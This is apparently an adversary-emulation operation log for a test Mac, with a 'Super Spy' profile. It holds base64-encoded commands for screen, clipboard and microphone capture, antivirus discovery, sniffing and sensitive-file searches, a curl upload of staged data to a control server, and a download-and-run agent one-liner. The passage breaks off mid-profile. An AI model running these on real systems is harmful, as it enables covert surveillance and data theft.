@@ -1,0 +1,1527 @@
+{
+  "name": "Mac Computer Attack Simulation",
+  "host_group": [
+    {
+      "paw": "itmitq",
+      "group": "Mac",
+      "architecture": "amd64",
+      "platform": "darwin",
+      "server": "http://192.168.10.60:8888",
+      "location": "./sandcat.go",
+      "pid": 2711,
+      "ppid": 2700,
+      "trusted": 0,
+      "last_seen": "2020-03-25 04:25:23",
+      "sleep_min": 30,
+      "sleep_max": 60,
+      "executors": [
+        "osa",
+        "sh"
+      ],
+      "privilege": "User",
+      "display_name": "ITs-MacBook-Pro.local$TestAcctLocal3",
+      "exe_name": "sandcat.go",
+      "host": "ITs-MacBook-Pro.local",
+      "watchdog": 0,
+      "contact": "http"
+    }
+  ],
+  "start": "2020-03-25 02:03:09",
+  "steps": {
+    "itmitq": {
+      "steps": [
+        {
+          "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
+          "command": "bWtkaXIgLXAgc3RhZ2VkICYmIGVjaG8gJFBXRC9zdGFnZWQ=",
+          "delegated": "2020-03-25 02:03:09",
+          "run": "2020-03-25 02:03:49",
+          "status": 0,
+          "platform": "darwin",
+          "executor": "sh",
+          "pid": 2724,
+          "description": "create a directory for exfil staging",
+          "name": "Create staging directory",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Data Staged",
+            "technique_id": "T1074"
+          },
+          "output": "/Users/TestAcctLocal3/staged"
+        },
+        {
+          "ability_id": "316251ed-6a28-4013-812b-ddf5b5b007f8",
+          "command": "Zm9yIGkgaW4gezEuLjV9OyBkbyBzY3JlZW5jYXB0dXJlIC10IHBuZyBzY3JlZW4tJGkucG5nOyBlY2hvICIkKGNkICIkKGRpcm5hbWUgIiQxIikiOyBwd2QgLVApLyQoYmFzZW5hbWUgInNjcmVlbi0kaS5wbmciKSI7IHNsZWVwIDU7IGRvbmU7",
+          "delegated": "2020-03-25 02:03:09",
+          "run": "2020-03-25 02:04:22",
+          "status": 0,
+          "platform": "darwin",
+          "executor": "sh",
+          "pid": 2726,
+          "description": "capture the contents of the screen",
+          "name": "Screen Capture",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Screen Capture",
+            "technique_id": "T1113"
+          },
+          "output": "/Users/TestAcctLocal3/screen-1.png/Users/TestAcctLocal3/screen-2.png/Users/TestAcctLocal3/screen-3.png/Users/TestAcctLocal3/screen-4.png/Users/TestAcctLocal3/screen-5.png"
+        },
+        {
+          "ability_id": "b007fe0c-c6b0-4fda-915c-255bbc070de2",
+          "command": "cGJwYXN0ZQ==",
+          "delegated": "2020-03-25 02:03:09",
+          "run": "2020-03-25 02:04:00",
+          "status": 0,
+          "platform": "darwin",
+          "executor": "sh",
+          "pid": 2744,
+          "description": "copy the contents for the clipboard and print them",
+          "name": "Copy Clipboard",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Clipboard Data",
+            "technique_id": "T1115"
+          },
+          "output": "A GoLang agent which communicates through the HTTP contact (sh)\rserver=\"http://127.0.0.1:8888\";curl -s -X POST -H \"file:sandcat.go\" -H \"platform:darwin\" $server/file/download > sandcat.go;chmod +x sandcat.go;./sandcat.go -server $server -v"
+        },
+        {
+          "ability_id": "b007fc38-9eb7-4320-92b3-9a3ad3e6ec25",
+          "command": "Y2F0IH4vTGlicmFyeS9BcHBsaWNhdGlvblwgU3VwcG9ydC9Hb29nbGUvQ2hyb21lL0RlZmF1bHQvQm9va21hcmtz",
+          "delegated": "2020-03-25 02:03:09",
+          "run": "2020-03-25 02:04:06",
+          "status": 1,
+          "platform": "darwin",
+          "executor": "sh",
+          "pid": 2752,
+          "description": "Get Chrome Bookmarks",
+          "name": "Get Chrome Bookmarks",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Browser Bookmark Discovery",
+            "technique_id": "T1217"
+          },
+          "output": "cat: /Users/TestAcctLocal3/Library/Application Support/Google/Chrome/Default/Bookmarks: No such file or directory"
+        },
+        {
+          "ability_id": "78524da1-f347-4fbb-9295-209f1f408330",
+          "command": "YnJldyBpbnN0YWxsIHNveCA+L2Rldi9udWxsIDI+JjE7c294IC1kIHJlY29yZGluZy53YXYgdHJpbSAwIDE1ID4vZGV2L251bGwgMj4mMTs=",
+          "delegated": "2020-03-25 02:03:09",
+          "run": "2020-03-25 02:04:14",
+          "status": 1,
+          "platform": "darwin",
+          "executor": "sh",
+          "pid": 2767,
+          "description": "Install sox and record microphone for n-seconds",
+          "name": "Record microphone",
+          "attack": {
+            "tactic": "impact",
+            "technique_name": "Resource Hijacking",
+            "technique_id": "T1496"
+          }
+        },
+        {
+          "ability_id": "2dece965-37a0-4f70-a391-0f30e3331aba",
+          "command": "ZmluZCAvQXBwbGljYXRpb25zLyAtbWF4ZGVwdGggMiAtaW5hbWUgKi5hcHAgfCBncmVwIC1pbyAiW2EteiBdKlwuYXBwIiB8IGdyZXAgLUVpIC0tICJzeW1hbnRlY3xub3J0b258Yml0ZGVmZW5kZXJ8a2FwZXJza3l8ZXNldHxhdmFzdHxhdmlyYXxtYWx3YXJlYnl0ZXN8c29waG9zfCh0cmVuZCBtaWNybyki",
+          "delegated": "2020-03-25 02:04:25",
+          "run": "2020-03-25 02:05:00",
+          "status": 1,
+          "platform": "darwin",
+          "executor": "sh",
+          "pid": 2777,
+          "description": "Identify AV",
+          "name": "Discover antivirus programs",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "Security Software Discovery",
+            "technique_id": "T1063"
+          }
+        },
+        {
+          "ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74",
+          "command": "dGFyIC1QIC16Y2YgL1VzZXJzL1Rlc3RBY2N0TG9jYWwzL3N0YWdlZC50YXIuZ3ogL1VzZXJzL1Rlc3RBY2N0TG9jYWwzL3N0YWdlZCAmJiBlY2hvIC9Vc2Vycy9UZXN0QWNjdExvY2FsMy9zdGFnZWQudGFyLmd6",
+          "delegated": "2020-03-25 02:05:01",
+          "run": "2020-03-25 02:05:07",
+          "status": 0,
+          "platform": "darwin",
+          "executor": "sh",
+          "pid": 2781,
+          "description": "Compress a directory on the file system",
+          "name": "Compress staged directory",
+          "attack": {
+            "tactic": "exfiltration",
+            "technique_name": "Data Compressed",
+            "technique_id": "T1002"
+          },
+          "output": "/Users/TestAcctLocal3/staged.tar.gz"
+        },
+        {
+          "ability_id": "1b4fb81c-8090-426c-93ab-0a633e7a16a7",
+          "command": "dGNwZHVtcCAtaSBlbjAgJiBzbGVlcCA1OyBraWxsICQh",
+          "delegated": "2020-03-25 02:05:01",
+          "run": "2020-03-25 02:05:18",
+          "status": 1,
+          "platform": "darwin",
+          "executor": "sh",
+          "pid": 2784,
+          "description": "Perform a packet capture",
+          "name": "Sniff network traffic",
+          "attack": {
+            "tactic": "credential-access",
+            "technique_name": "Network Sniffing",
+            "technique_id": "T1040"
+          },
+          "output": "tcpdump: en0: You don't have permission to capture on that device((cannot open BPF device) /dev/bpf0: Permission denied)sh: line 0: kill: (2785) - No such process"
+        },
+        {
+          "ability_id": "a0676fe1-cd52-482e-8dde-349b73f9aa69",
+          "command": "Li93aWZpLnNoIHByZWY=",
+          "delegated": "2020-03-25 02:05:01",
+          "run": "2020-03-25 02:05:19",
+          "status": 0,
+          "platform": "darwin",
+          "executor": "sh",
+          "pid": 2787,
+          "description": "See the most used WIFI networks of a machine",
+          "name": "Preferred WIFI",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Network Configuration Discovery",
+            "technique_id": "T1016"
+          },
+          "output": "Preferred networks on en0:\tBANK_POV"
+        },
+        {
+          "ability_id": "9a30740d-3aa8-4c23-8efa-d51215e8a5b9",
+          "command": "Li93aWZpLnNoIHNjYW4=",
+          "delegated": "2020-03-25 02:05:01",
+          "run": "2020-03-25 02:05:27",
+          "status": 0,
+          "platform": "darwin",
+          "executor": "sh",
+          "pid": 2790,
+          "description": "View all potential WIFI networks on host",
+          "name": "Scan WIFI networks",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Network Configuration Discovery",
+            "technique_id": "T1016"
+          },
+          "output": "                            SSID BSSID             RSSI CHANNEL HT CC SECURITY (auth/unicast/group)                        ENTIIS5G 24:de:c6:3a:c7:d3 -86  116,+1  Y  -- WPA2(PSK/AES/AES)                    WSSG-MIST-141 5c:5b:35:bd:1b:fa -86  116     Y  SG WPA2(PSK/AES/AES)                     WSSG-AC_5GHz 5c:5b:35:bd:1b:f8 -85  116     Y  SG WPA2(PSK/AES/AES)                  WSSG-MIST-DOT1X 5c:5b:35:bd:1b:f7 -85  116     Y  SG WPA2(802.1x/AES/AES)                        WSSG-MIST 5c:5b:35:bd:1b:f1 -85  116     Y  SG WPA2(PSK/AES/AES)                         Palms_AP 60:45:cb:ad:4b:6c -86  108,+1  Y  -- WPA2(PSK/AES/AES)                           westfi b4:de:31:40:b9:df -78  100,+1  Y  SG WPA2(802.1x,Unrecognized(0)/AES/AES)                           westfi b0:aa:77:d7:cc:af -69  60,+1   Y  SG WPA2(802.1x,Unrecognized(0)/AES/AES)                           westfi ec:bd:1d:c2:e7:cf -81  52,+1   Y  SG WPA2(802.1x,Unrecognized(0)/AES/AES)                           westfi 50:87:89:a9:19:6f -68  52,+1   Y  SG WPA2(802.1x,Unrecognized(0)/AES/AES)                          WSSG-AC e6:cb:ac:33:e8:c7 -62  157     Y  SG WPA(PSK/AES,TKIP/TKIP) WPA2(PSK/AES,TKIP/TKIP)                     #MerakiGuest 8a:15:14:b6:fd:73 -72  157     Y  SG NONE                          WSSG-N e2:cb:ac:33:e8:c7 -57  157     Y  SG WPA2(PSK/AES/AES)                     #MerakiStaff 8a:15:14:b6:fd:70 -72  157     Y  SG WPA2(PSK/AES/AES)                           westfi f4:4e:05:d8:5f:df -48  157     Y  AU WPA2(802.1x,Unrecognized(0)/AES/AES)                           westfi 74:a2:e6:60:cc:bf -65  48      Y  SG WPA2(802.1x,Unrecognized(0)/AES/AES)                           westfi b4:de:31:4e:84:6f -59  44,+1   Y  SG WPA2(802.1x,Unrecognized(0)/AES/AES)                           westfi f4:0f:1b:32:4c:af -72  36,+1   Y  SG WPA2(802.1x,Unrecognized(0)/AES/AES)                        westguest 5c:50:15:04:1d:7f -89  36      Y  AU WPA2(PSK/AES/AES)         Westcon Managed Services 6e:3a:0e:84:78:2f -55  36      Y  SG WPA2(PSK/AES/AES)                           westfi f4:0f:1b:25:f9:3f -62  36,+1   Y  SG WPA2(802.1x,Unrecognized(0)/AES/AES)                           westfi f4:0f:1b:30:4c:af -74  36,+1   Y  SG WPA2(802.1x,Unrecognized(0)/AES/AES)                        westguest c0:25:5c:69:78:a0 -47  11      Y  AU WPA2(PSK/AES/AES)                     V3SmartTech2 e4:6f:13:37:dc:b0 -70  11      Y  -- WPA(PSK/AES,TKIP/TKIP) WPA2(PSK/AES,TKIP/TKIP)                           westfi f4:0f:1b:25:f9:30 -75  11      Y  SG WPA2(802.1x,Unrecognized(0)/AES/AES)                      Biz@Staff01 6c:aa:b3:5a:78:a8 -72  11      Y  -- WPA2(PSK/AES,TKIP/TKIP)                           westfi f4:4e:05:d8:5f:d0 -57  11      Y  AU WPA2(802.1x,Unrecognized(0)/AES/AES)                           westfi 74:a2:e6:60:cc:b0 -85  6       Y  SG WPA2(802.1x,Unrecognized(0)/AES/AES)                     SINGTEL-CA31 00:26:75:99:ca:32 -61  4       Y  -- WPA(PSK/AES,TKIP/TKIP) WPA2(PSK/AES,TKIP/TKIP)                           Zerolg 92:25:00:db:37:6f -28  6       Y  SG WPA2(PSK/AES/AES)         Westcon Managed Services 6e:3a:1e:84:78:2f -57  1       Y  SG WPA2(PSK/AES/AES)                           westfi f4:0f:1b:32:4c:a0 -65  1       Y  SG WPA2(802.1x,Unrecognized(0)/AES/AES) "
+        },
+        {
+          "ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e",
+          "command": "Y3VybCAtRiAiZGF0YT1AL1VzZXJzL1Rlc3RBY2N0TG9jYWwzL3N0YWdlZC50YXIuZ3oiIC0taGVhZGVyICJYLVJlcXVlc3QtSUQ6IGBob3N0bmFtZWAtaXRtaXRxIiBodHRwOi8vMTkyLjE2OC4xMC42MDo4ODg4L2ZpbGUvdXBsb2Fk",
+          "delegated": "2020-03-25 02:05:28",
+          "run": "2020-03-25 02:05:29",
+          "status": 0,
+          "platform": "darwin",
+          "executor": "sh",
+          "pid": 2792,
+          "description": "Exfil the staged directory",
+          "name": "Exfil staged directory",
+          "attack": {
+            "tactic": "exfiltration",
+            "technique_name": "Exfiltration Over Command and Control Channel",
+            "technique_id": "T1041"
+          },
+          "output": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100   330    0     0  100   330      0  33000 --:--:-- --:--:-- --:--:-- 33000"
+        }
+      ]
+    }
+  },
+  "finish": null,
+  "planner": "sequential",
+  "adversary": {
+    "adversary_id": "564ae20d-778d-4965-93dc-b523be2e2ab4",
+    "name": "Super Spy",
+    "description": "Monitor the active user and navigate through their digital belongings",
+    "phases": {
+      "1": [
+        {
+          "id": "316251ed-6a28-4013-812b-ddf5b5b007f8darwinsh",
+          "ability_id": "316251ed-6a28-4013-812b-ddf5b5b007f8",
+          "tactic": "collection",
+          "technique_name": "Screen Capture",
+          "technique_id": "T1113",
+          "name": "Screen Capture",
+          "test": "Zm9yIGkgaW4gezEuLjV9OyBkbyBzY3JlZW5jYXB0dXJlIC10IHBuZyBzY3JlZW4tJGkucG5nOyBlY2hvICIkKGNkICIkKGRpcm5hbWUgIiQxIikiOyBwd2QgLVApLyQoYmFzZW5hbWUgInNjcmVlbi0kaS5wbmciKSI7IHNsZWVwIDU7IGRvbmU7",
+          "description": "capture the contents of the screen",
+          "cleanup": [],
+          "executor": "sh",
+          "unique": "316251ed-6a28-4013-812b-ddf5b5b007f8darwinsh",
+          "platform": "darwin",
+          "payload": "",
+          "parsers": [],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "316251ed-6a28-4013-812b-ddf5b5b007f8windowspsh",
+          "ability_id": "316251ed-6a28-4013-812b-ddf5b5b007f8",
+          "tactic": "collection",
+          "technique_name": "Screen Capture",
+          "technique_id": "T1113",
+          "name": "Screen Capture",
+          "test": "W1JlZmxlY3Rpb24uQXNzZW1ibHldOjpMb2FkV2l0aFBhcnRpYWxOYW1lKCJTeXN0ZW0uRHJhd2luZyIpO2Z1bmN0aW9uIHNjcmVlbnNob3QoW0RyYXdpbmcuUmVjdGFuZ2xlXSRib3VuZHMsICRwYXRoKSB7ICAgJGJtcCA9IE5ldy1PYmplY3QgRHJhd2luZy5CaXRtYXAgJGJvdW5kcy53aWR0aCwgJGJvdW5kcy5oZWlnaHQ7ICAgJGdyYXBoaWNzID0gW0RyYXdpbmcuR3JhcGhpY3NdOjpGcm9tSW1hZ2UoJGJtcCk7ICAgJGdyYXBoaWNzLkNvcHlGcm9tU2NyZWVuKCRib3VuZHMuTG9jYXRpb24sIFtEcmF3aW5nLlBvaW50XTo6RW1wdHksICRib3VuZHMuc2l6ZSk7ICAgJGJtcC5TYXZlKCRwYXRoKTsgICAkZ3JhcGhpY3MuRGlzcG9zZSgpOyAgICRibXAuRGlzcG9zZSgpO30kYm91bmRzID0gW0RyYXdpbmcuUmVjdGFuZ2xlXTo6RnJvbUxUUkIoMCwgMCwgMTAwMCwgOTAwKTtzY3JlZW5zaG90ICRib3VuZHMgIiRIT01FXERlc2t0b3Bcc2NyZWVuc2hvdC5wbmciOw==",
+          "description": "capture the contents of the screen",
+          "cleanup": [],
+          "executor": "psh",
+          "unique": "316251ed-6a28-4013-812b-ddf5b5b007f8windowspsh",
+          "platform": "windows",
+          "payload": "",
+          "parsers": [],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "316251ed-6a28-4013-812b-ddf5b5b007f8windowspwsh",
+          "ability_id": "316251ed-6a28-4013-812b-ddf5b5b007f8",
+          "tactic": "collection",
+          "technique_name": "Screen Capture",
+          "technique_id": "T1113",
+          "name": "Screen Capture",
+          "test": "W1JlZmxlY3Rpb24uQXNzZW1ibHldOjpMb2FkV2l0aFBhcnRpYWxOYW1lKCJTeXN0ZW0uRHJhd2luZyIpO2Z1bmN0aW9uIHNjcmVlbnNob3QoW0RyYXdpbmcuUmVjdGFuZ2xlXSRib3VuZHMsICRwYXRoKSB7ICAgJGJtcCA9IE5ldy1PYmplY3QgRHJhd2luZy5CaXRtYXAgJGJvdW5kcy53aWR0aCwgJGJvdW5kcy5oZWlnaHQ7ICAgJGdyYXBoaWNzID0gW0RyYXdpbmcuR3JhcGhpY3NdOjpGcm9tSW1hZ2UoJGJtcCk7ICAgJGdyYXBoaWNzLkNvcHlGcm9tU2NyZWVuKCRib3VuZHMuTG9jYXRpb24sIFtEcmF3aW5nLlBvaW50XTo6RW1wdHksICRib3VuZHMuc2l6ZSk7ICAgJGJtcC5TYXZlKCRwYXRoKTsgICAkZ3JhcGhpY3MuRGlzcG9zZSgpOyAgICRibXAuRGlzcG9zZSgpO30kYm91bmRzID0gW0RyYXdpbmcuUmVjdGFuZ2xlXTo6RnJvbUxUUkIoMCwgMCwgMTAwMCwgOTAwKTtzY3JlZW5zaG90ICRib3VuZHMgIiRIT01FXERlc2t0b3Bcc2NyZWVuc2hvdC5wbmciOw==",
+          "description": "capture the contents of the screen",
+          "cleanup": [],
+          "executor": "pwsh",
+          "unique": "316251ed-6a28-4013-812b-ddf5b5b007f8windowspwsh",
+          "platform": "windows",
+          "payload": "",
+          "parsers": [],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "b007fe0c-c6b0-4fda-915c-255bbc070de2darwinsh",
+          "ability_id": "b007fe0c-c6b0-4fda-915c-255bbc070de2",
+          "tactic": "collection",
+          "technique_name": "Clipboard Data",
+          "technique_id": "T1115",
+          "name": "Copy Clipboard",
+          "test": "cGJwYXN0ZQ==",
+          "description": "copy the contents for the clipboard and print them",
+          "cleanup": [],
+          "executor": "sh",
+          "unique": "b007fe0c-c6b0-4fda-915c-255bbc070de2darwinsh",
+          "platform": "darwin",
+          "payload": "",
+          "parsers": [],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "b007fe0c-c6b0-4fda-915c-255bbc070de2windowspsh",
+          "ability_id": "b007fe0c-c6b0-4fda-915c-255bbc070de2",
+          "tactic": "collection",
+          "technique_name": "Clipboard Data",
+          "technique_id": "T1115",
+          "name": "Copy Clipboard",
+          "test": "R2V0LUNsaXBib2FyZCAtcmF3",
+          "description": "copy the contents for the clipboard and print them",
+          "cleanup": [],
+          "executor": "psh",
+          "unique": "b007fe0c-c6b0-4fda-915c-255bbc070de2windowspsh",
+          "platform": "windows",
+          "payload": "",
+          "parsers": [],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "b007fe0c-c6b0-4fda-915c-255bbc070de2windowspwsh",
+          "ability_id": "b007fe0c-c6b0-4fda-915c-255bbc070de2",
+          "tactic": "collection",
+          "technique_name": "Clipboard Data",
+          "technique_id": "T1115",
+          "name": "Copy Clipboard",
+          "test": "R2V0LUNsaXBib2FyZCAtcmF3",
+          "description": "copy the contents for the clipboard and print them",
+          "cleanup": [],
+          "executor": "pwsh",
+          "unique": "b007fe0c-c6b0-4fda-915c-255bbc070de2windowspwsh",
+          "platform": "windows",
+          "payload": "",
+          "parsers": [],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "b007fe0c-c6b0-4fda-915c-255bbc070de2linuxsh",
+          "ability_id": "b007fe0c-c6b0-4fda-915c-255bbc070de2",
+          "tactic": "collection",
+          "technique_name": "Clipboard Data",
+          "technique_id": "T1115",
+          "name": "Copy Clipboard",
+          "test": "eGNsaXAgLW8=",
+          "description": "copy the contents for the clipboard and print them",
+          "cleanup": [],
+          "executor": "sh",
+          "unique": "b007fe0c-c6b0-4fda-915c-255bbc070de2linuxsh",
+          "platform": "linux",
+          "payload": "",
+          "parsers": [],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "b007fc38-9eb7-4320-92b3-9a3ad3e6ec25darwinsh",
+          "ability_id": "b007fc38-9eb7-4320-92b3-9a3ad3e6ec25",
+          "tactic": "discovery",
+          "technique_name": "Browser Bookmark Discovery",
+          "technique_id": "T1217",
+          "name": "Get Chrome Bookmarks",
+          "test": "Y2F0IH4vTGlicmFyeS9BcHBsaWNhdGlvblwgU3VwcG9ydC9Hb29nbGUvQ2hyb21lL0RlZmF1bHQvQm9va21hcmtz",
+          "description": "Get Chrome Bookmarks",
+          "cleanup": [],
+          "executor": "sh",
+          "unique": "b007fc38-9eb7-4320-92b3-9a3ad3e6ec25darwinsh",
+          "platform": "darwin",
+          "payload": "",
+          "parsers": [
+            {
+              "module": "plugins.stockpile.app.parsers.bookmarks",
+              "relationships": [
+                {
+                  "source": "host.chrome.bookmark_title",
+                  "edge": "resolves_to",
+                  "target": "host.chrome.bookmark_url"
+                }
+              ]
+            }
+          ],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "78524da1-f347-4fbb-9295-209f1f408330darwinsh",
+          "ability_id": "78524da1-f347-4fbb-9295-209f1f408330",
+          "tactic": "impact",
+          "technique_name": "Resource Hijacking",
+          "technique_id": "T1496",
+          "name": "Record microphone",
+          "test": "YnJldyBpbnN0YWxsIHNveCA+L2Rldi9udWxsIDI+JjE7c294IC1kIHJlY29yZGluZy53YXYgdHJpbSAwIDE1ID4vZGV2L251bGwgMj4mMTs=",
+          "description": "Install sox and record microphone for n-seconds",
+          "cleanup": [],
+          "executor": "sh",
+          "unique": "78524da1-f347-4fbb-9295-209f1f408330darwinsh",
+          "platform": "darwin",
+          "payload": "",
+          "parsers": [],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 120,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "90c2efaa-8205-480d-8bb6-61d90dbaf81bdarwinsh",
+          "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+          "tactic": "collection",
+          "technique_name": "Data from Local System",
+          "technique_id": "T1005",
+          "name": "Find files",
+          "test": "ZmluZCAvVXNlcnMgLW5hbWUgJyouI3tmaWxlLnNlbnNpdGl2ZS5leHRlbnNpb259JyAtdHlwZSBmIC1ub3QgLXBhdGggJyovXC4qJyAtc2l6ZSAtNTAwayAyPi9kZXYvbnVsbCB8IGhlYWQgLTU=",
+          "description": "Locate files deemed sensitive",
+          "cleanup": [],
+          "executor": "sh",
+          "unique": "90c2efaa-8205-480d-8bb6-61d90dbaf81bdarwinsh",
+          "platform": "darwin",
+          "payload": "",
+          "parsers": [],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "90c2efaa-8205-480d-8bb6-61d90dbaf81bwindowspsh",
+          "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+          "tactic": "collection",
+          "technique_name": "Data from Local System",
+          "technique_id": "T1005",
+          "name": "Find files",
+          "test": "R2V0LUNoaWxkSXRlbSBDOlxVc2VycyAtUmVjdXJzZSAtSW5jbHVkZSAqLiN7ZmlsZS5zZW5zaXRpdmUuZXh0ZW5zaW9ufSAtRXJyb3JBY3Rpb24gJ1NpbGVudGx5Q29udGludWUnIHwgZm9yZWFjaCB7JF8uRnVsbE5hbWV9IHwgU2VsZWN0LU9iamVjdCAtZmlyc3QgNTtleGl0IDA7",
+          "description": "Locate files deemed sensitive",
+          "cleanup": [],
+          "executor": "psh",
+          "unique": "90c2efaa-8205-480d-8bb6-61d90dbaf81bwindowspsh",
+          "platform": "windows",
+          "payload": "",
+          "parsers": [],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "90c2efaa-8205-480d-8bb6-61d90dbaf81bwindowspwsh",
+          "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+          "tactic": "collection",
+          "technique_name": "Data from Local System",
+          "technique_id": "T1005",
+          "name": "Find files",
+          "test": "R2V0LUNoaWxkSXRlbSBDOlxVc2VycyAtUmVjdXJzZSAtSW5jbHVkZSAqLiN7ZmlsZS5zZW5zaXRpdmUuZXh0ZW5zaW9ufSAtRXJyb3JBY3Rpb24gJ1NpbGVudGx5Q29udGludWUnIHwgZm9yZWFjaCB7JF8uRnVsbE5hbWV9IHwgU2VsZWN0LU9iamVjdCAtZmlyc3QgNTtleGl0IDA7",
+          "description": "Locate files deemed sensitive",
+          "cleanup": [],
+          "executor": "pwsh",
+          "unique": "90c2efaa-8205-480d-8bb6-61d90dbaf81bwindowspwsh",
+          "platform": "windows",
+          "payload": "",
+          "parsers": [],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "90c2efaa-8205-480d-8bb6-61d90dbaf81blinuxsh",
+          "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+          "tactic": "collection",
+          "technique_name": "Data from Local System",
+          "technique_id": "T1005",
+          "name": "Find files",
+          "test": "ZmluZCAvIC1uYW1lICcqLiN7ZmlsZS5zZW5zaXRpdmUuZXh0ZW5zaW9ufScgLXR5cGUgZiAtbm90IC1wYXRoICcqL1wuKicgLXNpemUgLTUwMGsgMj4vZGV2L251bGwgfCBoZWFkIC01",
+          "description": "Locate files deemed sensitive",
+          "cleanup": [],
+          "executor": "sh",
+          "unique": "90c2efaa-8205-480d-8bb6-61d90dbaf81blinuxsh",
+          "platform": "linux",
+          "payload": "",
+          "parsers": [],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "6469befa-748a-4b9c-a96d-f191fde47d89darwinsh",
+          "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
+          "tactic": "collection",
+          "technique_name": "Data Staged",
+          "technique_id": "T1074",
+          "name": "Create staging directory",
+          "test": "bWtkaXIgLXAgc3RhZ2VkICYmIGVjaG8gJFBXRC9zdGFnZWQ=",
+          "description": "create a directory for exfil staging",
+          "cleanup": [
+            "cm0gLXJmIHN0YWdlZA=="
+          ],
+          "executor": "sh",
+          "unique": "6469befa-748a-4b9c-a96d-f191fde47d89darwinsh",
+          "platform": "darwin",
+          "payload": "",
+          "parsers": [
+            {
+              "module": "plugins.stockpile.app.parsers.basic",
+              "relationships": [
+                {
+                  "source": "host.dir.staged",
+                  "edge": "",
+                  "target": ""
+                }
+              ]
+            }
+          ],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "6469befa-748a-4b9c-a96d-f191fde47d89linuxsh",
+          "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
+          "tactic": "collection",
+          "technique_name": "Data Staged",
+          "technique_id": "T1074",
+          "name": "Create staging directory",
+          "test": "bWtkaXIgLXAgc3RhZ2VkICYmIGVjaG8gJFBXRC9zdGFnZWQ=",
+          "description": "create a directory for exfil staging",
+          "cleanup": [
+            "cm0gLXJmIHN0YWdlZA=="
+          ],
+          "executor": "sh",
+          "unique": "6469befa-748a-4b9c-a96d-f191fde47d89linuxsh",
+          "platform": "linux",
+          "payload": "",
+          "parsers": [
+            {
+              "module": "plugins.stockpile.app.parsers.basic",
+              "relationships": [
+                {
+                  "source": "host.dir.staged",
+                  "edge": "",
+                  "target": ""
+                }
+              ]
+            }
+          ],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "6469befa-748a-4b9c-a96d-f191fde47d89windowspsh",
+          "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
+          "tactic": "collection",
+          "technique_name": "Data Staged",
+          "technique_id": "T1074",
+          "name": "Create staging directory",
+          "test": "TmV3LUl0ZW0gLVBhdGggIi4iIC1OYW1lICJzdGFnZWQiIC1JdGVtVHlwZSAiZGlyZWN0b3J5IiAtRm9yY2UgfCBmb3JlYWNoIHskXy5GdWxsTmFtZX0gfCBTZWxlY3QtT2JqZWN0",
+          "description": "create a directory for exfil staging",
+          "cleanup": [
+            "UmVtb3ZlLUl0ZW0gLVBhdGggInN0YWdlZCIgLXJlY3Vyc2U="
+          ],
+          "executor": "psh",
+          "unique": "6469befa-748a-4b9c-a96d-f191fde47d89windowspsh",
+          "platform": "windows",
+          "payload": "",
+          "parsers": [
+            {
+              "module": "plugins.stockpile.app.parsers.basic",
+              "relationships": [
+                {
+                  "source": "host.dir.staged",
+                  "edge": "",
+                  "target": ""
+                }
+              ]
+            }
+          ],
+          "requirements": [],
+          "privilege": "",
+          "timeout": 60,
+          "access": 1,
+          "variations": []
+        },
+        {
+          "id": "6469befa-748a-4b9c-a96d-f191fde47d89windowspwsh",
+          "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
+          "tactic": "collection",
+          "technique_name": "Data Staged",
+          "technique_id": "T1074",
+          "name": "Create staging directory",
+          "test": "TmV3LUl0ZW0gLVBhdGggIi4iIC1OYW1lICJzdGFnZWQiIC1JdGVtVHlwZSAiZGlyZWN0b3J5IiAtRm9yY2UgfCBmb3JlYWNoIHskXy5GdWxsTmFtZX0gfCBTZWxlY3QtT2JqZWN0",
+          "description": "create a directory for exfil staging",
+          "cleanup": [
